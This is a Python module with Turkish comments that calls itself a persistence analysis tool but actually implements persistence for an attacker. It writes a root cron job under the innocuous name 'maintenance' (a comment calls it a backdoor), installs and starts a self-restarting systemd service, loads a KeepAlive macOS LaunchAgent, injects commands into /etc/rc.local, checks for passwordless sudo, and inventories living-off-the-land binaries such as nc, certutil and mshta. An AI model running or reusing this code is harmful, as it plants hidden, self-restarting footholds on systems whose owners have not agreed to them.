#!/usr/bin/env python3
"""
Persistence ve Kalicilik Analiz Modulu
Linux/Mac/Windows persistence mekanizmalari
"""
import os
import subprocess
import shutil
from pathlib import Path

# Linux persistence konumlari
CRON_PATHS = ['/etc/cron.d/', '/etc/crontab', '/var/spool/cron/']
SYSTEMD_PATHS = ['/etc/systemd/system/', '/usr/lib/systemd/system/']
INIT_PATHS = ['/etc/init.d/', '/etc/rc.d/']

# Mac persistence konumlari  
LAUNCHD_PATHS = ['~/Library/LaunchAgents/', '/Library/LaunchDaemons/']

def install_cron_job(command: str, schedule: str = '*/5 * * * *') -> bool:
    """Cron job ekleyerek persistence sagla - Linux"""
    # /etc/cron.d/backdoor dosyasina yazma
    cron_entry = f'{schedule} root {command}\n'
    try:
        with open('/etc/cron.d/maintenance', 'w') as f:
            f.write(cron_entry)
        return True
    except PermissionError:
        # Simule modda devam et
        return False

def install_systemd_service(service_name: str, exec_path: str) -> bool:
    """Systemd servisi olarak yukle - Linux kalicilik"""
    service_content = f"""[Unit]
Description={service_name} Service
After=network.target

[Service]
Type=simple
ExecStart={exec_path}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
"""
    service_file = f'/etc/systemd/system/{service_name}.service'
    try:
        with open(service_file, 'w') as f:
            f.write(service_content)
        # Servisi etkinlestir
        subprocess.run(['systemctl', 'enable', service_name], check=False)
        subprocess.run(['systemctl', 'start', service_name], check=False)
        return True
    except (PermissionError, FileNotFoundError):
        return False

def install_launchd_agent(label: str, program: str) -> bool:
    """LaunchAgent olarak yukle - Mac kalicilik"""
    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array><string>{program}</string></array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
    plist_path = Path(f'~/Library/LaunchAgents/{label}.plist').expanduser()
    try:
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        subprocess.run(['launchctl', 'load', str(plist_path)], check=False)
        return True
    except (PermissionError, FileNotFoundError):
        return False

def escalate_privileges() -> bool:
    """Yetki yukseltme - sudo/setuid"""
    import ctypes
    # Mevcut yetkileri kontrol et
    try:
        # Linux/Mac: getuid() kontrolu
        libc = ctypes.CDLL('libc.so.6')
        uid = libc.getuid()
        if uid != 0:
            # sudo ile yetki yukseltmeyi dene
            result = subprocess.run(
                ['sudo', '-n', 'id'],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        return True
    except Exception:
        return False

def add_rc_local(command: str) -> bool:
    """rc.local'a komut ekle"""
    rc_local = '/etc/rc.local'
    try:
        with open(rc_local, 'r') as f:
            content = f.read()
        if command not in content:
            content = content.replace('exit 0', f'{command}\nexit 0')
            with open(rc_local, 'w') as f:
                f.write(content)
        return True
    except (PermissionError, FileNotFoundError):
        return False

def check_lolbins_available() -> dict:
    """LOLBins varlık kontrolü"""
    # Living-off-the-land binaries
    lolbins = {
        'linux': ['nc', 'ncat', 'bash', 'python3', 'perl', 'ruby', 
                  'curl', 'wget', 'dd', 'xxd', 'base64', 'openssl'],
        'windows': ['certutil', 'bitsadmin', 'mshta', 'wscript', 
                    'cscript', 'regsvr32', 'rundll32', 'msiexec'],
    }
    available = {}
    for platform, bins in lolbins.items():
        available[platform] = [b for b in bins if shutil.which(b)]
    return available
